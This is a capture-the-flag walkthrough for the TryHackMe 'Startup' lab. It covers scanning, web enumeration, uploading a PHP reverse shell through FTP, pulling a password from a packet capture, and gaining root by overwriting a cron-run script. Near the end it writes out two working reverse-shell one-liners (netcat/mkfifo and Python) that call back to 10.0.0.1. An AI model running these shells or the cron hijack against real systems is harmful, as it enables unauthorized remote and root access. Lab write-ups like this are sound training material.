# TryHackMe - Startup

## This outlines on how to pawn the TryHackMe Startup box

### Tools used: 
#### 1. Nmap
#### 2. Dirsearch
#### 3. Gobuster
#### 4. Wireshark
#### 5. Linpeas
#### 6. Pspy64

## Scanning and Enumeration

TryHackMe Startup IP: 10.10.x.x

1. Run 4 distinct Nmap scans

### **Half TCP Scan:**

```
nmap -sS -vv -T5 -Pn -p 1-20000 10.10.x.x -oN Half-TCP.txt
```

### **Version scan/Banner grabbing scan**

```
nmap -sV --version-all -vv -T5 -p 21,22,80 10.10.x.x -oN version-scan.txt 
```

### **Aggressive scan**

```
nmap -A -O --osscan-guess --osscan-limit -vv -T5 -oN aggressive-scan.txt
```

### **Nmap NSE vulnerability scan**

```
nmap --script vuln -p 21,22,80 10.10.x.x -oN nse_script_scan.txt
```

For the ports, it will differ depending on the Half TCP scan output  
Use the Nmap scan results to progress into the challenge

## Enumeration of the website

Website URL: http://10.10.x.x:80

After first visiting the website, your first instinct is to enumerate the target website for accessible directories and files.  
An instance of the Broken Access Control vulnerability of the OWASP Top 10 web vulnerabilities.

### **Dirsearch Directory Enumeration**:

```
dirsearch -u http://10.10.x.x -t 120
```

### **GoBuster Directory Enumeration**

```
gobuster dir -u http://10.10.x.x -w /path/to/directory-wordlist -X /path/to/file-wordlist
```

The two commands above will enumerate the entire website for accessible directories and files to be used throughout the CTF challenge.

For people who's gonna ask why I store the file extensions in a file, it's because it's easy to store them all in one file and I can make sure I don't miss out any file extension.

Whatever the output of these two commands for you, is what you will use and access

## Gaining Initial Foothold

If you properly enumerated the website in the previous step, you'd know that there is a FTP directory that connects the website and the FTP server

If you have the Kali Linux tool called **"Webshells"** installed then copy the Php reverse shell file and modify the listening IP and port.

**NOTE: IF YOU DON'T HAVE THE TOOL INSTALLED, THEN INSTALL IT USING THE COMMAND BELOW**

```
sudo apt install webshells
```

After modifying the file to have the listening IP and port, upload the file to the FTP server then execute the file.

Before running the Php reverse shell file, have a listener running on your Kali Linux box using the commands below:

```
nc -lvnp 9999
```

or

```
ncat -lvnp 9999
```

Change the port based on what port you have entered on the Php reverse shell file.

---  

After getting initial foothold on the system, your first instinct should be to find any suspicious files and directories

If you also enumerated properly, you would see a **"/incidents"** folder.  
Inside the folder you would see a .pcapng file, extract the file and use **Wireshark** on it.

```
python3 -m http.server 9999
```

Running the command above will start a Python http server and it will host the contents of the directory on the server.  
On your Kali Linux box, run the command below:

```
wget http://10.10.x.x:9999/suspicious.pcapng
```

Combining both of these commands, you first start a server then use the wget tool from your Kali Linux box to extract the .pcapng file.

## Wireshark Packet Analysis

After extracting the .pcapng file, run the command below:

```
wireshark suspicious.pcapng
```

Running the command will open the .pcapng file and it's up to you to analyze it.  
If you follow the TCP stream, you would see a password hidden there. Extract the password then login to SSH.

## SSH Login and Privilege Escalation

Using the credentials obtained from the packet file, login to SSH and extract the user.txt flag.

Assuming you have linpeas and pspy64 on your Kali Linux box, run the commands below on the directory to where the two tools are installed:

```
python3 -m http.server 9999
```

Use the wget on the target box to extract one or both tools.

```
wget http://10.10.x.x:9999/linpeas.sh
```

and

```
wget http://10.10.x.x/pspy
```

After getting the tools, add execute permissions to one or both files and execute it.

---

Most of the scan results are not that helpful except the ones from pspy64.  
Pspy64 will reveal cron jobs that are running on the box, if you analyze it carefully, you would see that root is executing a file per second/minute.

Go to the file location then modify the contents of that file to a one liner reverse shell.

You can choose from the two or use your own one liner reverse shell.


```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Save the contents of the file then set up a listener on your Kali Linux box then wait for the cron job to execute the file.

After a few seconds or minutes you should have a root reverse shell, if you do get a shell go to the **"/root"** directory the extract the root flag
